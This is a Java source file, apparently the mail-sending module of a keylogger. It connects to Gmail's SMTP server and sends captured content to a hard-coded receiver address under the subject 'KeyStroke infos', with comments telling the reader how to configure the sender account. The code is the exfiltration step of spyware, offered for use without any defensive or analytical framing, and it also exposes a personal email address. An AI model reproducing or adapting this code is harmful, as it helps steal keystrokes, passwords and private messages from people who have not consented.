package main.handlers;

import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;

public class Sender {

    private Sender(){}
    // You can put any email you want on this case , i will use a test mail that i just created  for this
    private static final String SENDER_EMAIL ="SENDEREMAIL";
    private static final String SENDER_PASS ="SENDERPASSWORD";

    // Receiver Email
    private static final String RECEIVER_EMAIL ="topayman5@gmail.com";

    // Mail config
    private static Properties mailServerProperties;
    private static Session mailSession;
    private static MimeMessage mailMessage;

    public static void sendMail(String content) throws Throwable{
        mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port","587");
        mailServerProperties.put("mail.smtp.auth","true");
        mailServerProperties.put("mail.smtp.ssl.trust", "smtp.gmail.com");
        mailServerProperties.put("mail.smtp.starttls.enable","true");

        mailSession=Session.getDefaultInstance(mailServerProperties);
        mailMessage = new MimeMessage(mailSession);
        mailMessage.addRecipients(Message.RecipientType.BCC, String.valueOf(new InternetAddress(RECEIVER_EMAIL)));
        // Here you can personalize your email
        mailMessage.setSubject("KeyStroke infos ");
        mailMessage.setContent(content,"text/html");

        Transport trans = mailSession.getTransport("smtp");
        trans.connect("smtp.gmail.com",SENDER_EMAIL,SENDER_PASS);
        trans.sendMessage(mailMessage,mailMessage.getAllRecipients());
        trans.close();

    }




}
